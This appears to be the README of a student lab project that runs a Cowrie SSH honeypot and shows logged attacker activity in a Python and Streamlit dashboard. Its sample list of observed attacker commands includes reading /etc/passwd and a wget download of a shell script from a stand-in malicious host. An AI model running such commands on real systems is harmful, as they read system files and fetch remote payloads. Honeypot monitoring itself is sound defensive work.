#Cowrie Honeypot Dashboard
## Overview
This project uses Cowrie to simulate and monitor SSH attacker activity in a controlled lab environment.
## Feature
- Captures attacker login attempts
- Logs attacker commands
- Parses Cowrie JSON logs using Python
- Visualizes attacker behavior with Matplotlib
- Displays attacker IPs and command activity in a Streamlit dashboard

## Tools Used
- Cowrie
- Python
- Matplotlib
- Streamlit
- Ubuntu VM

## Sample Attacker Commands Observed
- whoami
- uname -a
- ls
- pwd
- cat /etc/passwd
- wget http://malicious.com/malware.sh

## Sample Output
![Top Commands] (screenshots/commands.png)

## Files
- parser.py
- visualize.py
- dashboard.py
- commands.png

## Resume Summary
Built a Cowrie-based honeypot lab in Ubuntu, simulated SSH attacker behavior, parsed logs with Python, and developed a Streamlit dashboard to visualize attacker IPs and command activity.

